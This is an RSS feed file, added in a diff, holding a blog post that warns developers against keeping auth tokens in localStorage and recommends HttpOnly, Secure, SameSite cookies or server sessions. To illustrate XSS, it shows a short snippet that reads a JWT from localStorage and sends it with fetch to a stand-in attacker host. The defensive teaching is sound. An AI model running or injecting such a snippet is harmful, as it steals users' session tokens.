@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Authentication on fr0sttt</title><link>https://fr0sttt.dev/tags/authentication/</link><description>Recent content in Authentication on fr0sttt</description><generator>Hugo -- gohugo.io</generator><language>en</language><atom:link href="https://fr0sttt.dev/tags/authentication/index.xml" rel="self" type="application/rss+xml"/><item><title>Do Not Use LocalStorage To Save Session and Auth Tokens(Or Any Sensitive Information.)</title><link>https://fr0sttt.dev/p/do-not-use-localstorage-to-save-session-and-auth-tokens/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fr0sttt.dev/p/do-not-use-localstorage-to-save-session-and-auth-tokens/</guid><description>&lt;h1 id="why-using-localstorage-to-save-sensitive-information-is-unacceptable-in-2025">Why using LocalStorage to save sensitive information is UNACCEPTABLE in 2025
+&lt;/h1>&lt;p>Let&amp;rsquo;s be clear. It&amp;rsquo;s 2025. If you, as a developer, are still saving authentication tokens or any other sensitive information in localStorage, you&amp;rsquo;re doing it wrong. Period.&lt;/p>
+&lt;p>I&amp;rsquo;m deeply irritated by the number of tutorials, bootcamps, and articles that perpetuate this ridiculous practice. It&amp;rsquo;s a disservice to our profession and a wide-open door to vulnerabilities that should have been eliminated long ago. There&amp;rsquo;s no longer any excuse for making this mistake.&lt;/p>
+&lt;p>This article isn&amp;rsquo;t a debate. It&amp;rsquo;s an eviction order for an insecure practice. If you teach this, stop.&lt;/p>
+&lt;h2 id="first-things-first-what-is-localstorage">First Things First: What is LocalStorage?
+&lt;/h2>&lt;p>It&amp;rsquo;s a browser storage API. A simple JavaScript object where you throw key-value pairs. The end. It&amp;rsquo;s designed to store trivial things, like a user&amp;rsquo;s preference for a dark theme. Not to store the key to a safe. Using it for tokens is like writing down your bank password on a Post-it note and sticking it on your forehead.&lt;/p>
+&lt;h1 id="what-sucks-about-localstorage-besides-security">What sucks about localStorage? (Besides security)
+&lt;/h1>&lt;p>Before we even get into the security debacle, localStorage is a technically poor tool for modern web development.&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Blocks the Damn Main Thread&lt;/strong>: It&amp;rsquo;s synchronous. Every &lt;strong>getItem&lt;/strong> or &lt;strong>setItem&lt;/strong> locks up the UI. While the browser reads from disk, your application freezes. In 2025, with the obsession with performance and 60fps, using a synchronous API for I/O is just plain stupid.&lt;/li>
+&lt;li>&lt;strong>Only Storage Garbage (Strings)&lt;/strong>: It doesn&amp;rsquo;t store objects. You&amp;rsquo;re forced to do the JSON.stringify() and JSON.parse() nonsense for everything, adding useless code and potential points of failure. It&amp;rsquo;s primitive.&lt;/li>
+&lt;li>&lt;strong>Doesn&amp;rsquo;t Talk to Web Workers&lt;/strong>: Need to do heavy background processing to avoid crashing the page? Great. But your Web Workers don&amp;rsquo;t have access to localStorage. It&amp;rsquo;s useless for any minimally sophisticated architecture that requires shared state with background threads.&lt;/li>
+&lt;li>&lt;strong>Single Origin&lt;/strong>: localStorage is locked to the exact origin. &lt;code>app.site.com&lt;/code> can&amp;rsquo;t read what &lt;code>api.site.com&lt;/code> has stored. For authentication that needs to work across subdomains, it dies here.&lt;/li>
+&lt;/ul>
+&lt;p>For these reasons alone, he would be a poor choice. But now, let&amp;rsquo;s get to the main crime.&lt;/p>
+&lt;h1 id="the-deadly-sin-cross-site-scripting-xss">The Deadly Sin: Cross-Site Scripting (XSS)
+&lt;/h1>&lt;p>This is why any senior developer will laugh at you (or fire you) if you use localStorage for tokens.&lt;/p>
+&lt;p>Any script injected into your page has full and unrestricted access to localStorage. &lt;strong>ANY SCRIPT&lt;/strong>.&lt;/p>
+&lt;p>An XSS attack occurs when an attacker manages to inject a piece of JavaScript into your application. A malicious comment, an unhandled URL parameter, any slip-up. And all it takes is one line:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// malicious actor script injected into your page
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">stolenToken&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">localStorage&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getItem&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;jwt_token&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// send to the server (c2, etc.)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sb">`https://hacker-server.com/stolen-token?token=?token=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">stolenToken&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>GAME OVER.&lt;/p>
+&lt;p>The attacker has the token. They are now your user. They can access data, make purchases, transfer money, and delete the account. And it&amp;rsquo;s your fault for leaving the key under the rug. Trusting that your application is 100% XSS-proof is the height of arrogance.&lt;/p>
+&lt;h1 id="the-obvious-solution-they-ignore-cookies">The Obvious Solution They Ignore: Cookies
+&lt;/h1>&lt;p>The solution isn&amp;rsquo;t new, it&amp;rsquo;s not sexy, but it&amp;rsquo;s the right one and has worked for decades: cookies. But not just any cookie thrown in. Cookies configured like a pro.&lt;/p>
+&lt;p>When your backend generates a token, it must enclose it in a cookie with three MANDATORY flags:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>HttpOnly&lt;/code>: The most important. It makes the cookie &lt;strong>INACCESSIBLE&lt;/strong> to client-side JavaScript. &lt;code>document.cookie&lt;/code> simply doesn&amp;rsquo;t see this cookie. The XSS attack we described becomes useless. The attacker&amp;rsquo;s script tries to read it and finds nothing. Problem solved.&lt;/li>
+&lt;li>&lt;code>Secure&lt;/code>: Ensures that the cookie only travels over HTTPS. This prevents anyone in the middle (on a public Wi-Fi network, for example) from reading the cookie in plain text. This is basic digital hygiene.&lt;/li>
+&lt;li>&lt;code>SameSite=Strict (or Lax)&lt;/code>: Your weapon against &lt;strong>CSRF (Cross-Site Request Forgery)&lt;/strong> attacks. Prevents the browser from sending the cookie in requests from other sites, preventing a user from being tricked into performing actions without knowing.&lt;/li>
+&lt;/ul>
+&lt;p>Your response header should look like this, no excuses:&lt;/p>
+&lt;p>&lt;code>Set-Cookie: session_token=YOUR_TOKEN_HERE; HttpOnly; Secure; SameSite=Strict&lt;/code>&lt;/p>
+&lt;h1 id="classic-alternative-server-sessions">Classic Alternative: Server Sessions
+&lt;/h1>&lt;p>If you don&amp;rsquo;t like JWTs or have a more traditional application, use the time-tested and proven method: server-side sessions.&lt;/p>
+&lt;p>In this model, the server stores all sensitive data and sends only a random session ID to the client, inside a cookie with the same flags (HttpOnly, Secure, SameSite).&lt;/p>
+&lt;h1 id="no-more-excuses">No More Excuses
+&lt;/h1>&lt;p>Your job isn&amp;rsquo;t to do the easiest thing, it&amp;rsquo;s to do the right thing. Safety isn&amp;rsquo;t a luxury; it&amp;rsquo;s the foundation.&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>NEVER&lt;/strong> use localStorage for tokens or any sensitive data.&lt;/li>
+&lt;li>&lt;strong>ALWAYS&lt;/strong> use cookies.&lt;/li>
+&lt;li>Your cookie &lt;strong>MUST&lt;/strong> have the HttpOnly, Secure, and SameSite attributes.&lt;/li>
+&lt;li>Choose between Server-Side Sessions (stateful) or JWTs in Cookies (stateless) depending on your architecture.&lt;/li>
+&lt;/ul></description></item></channel></rss>
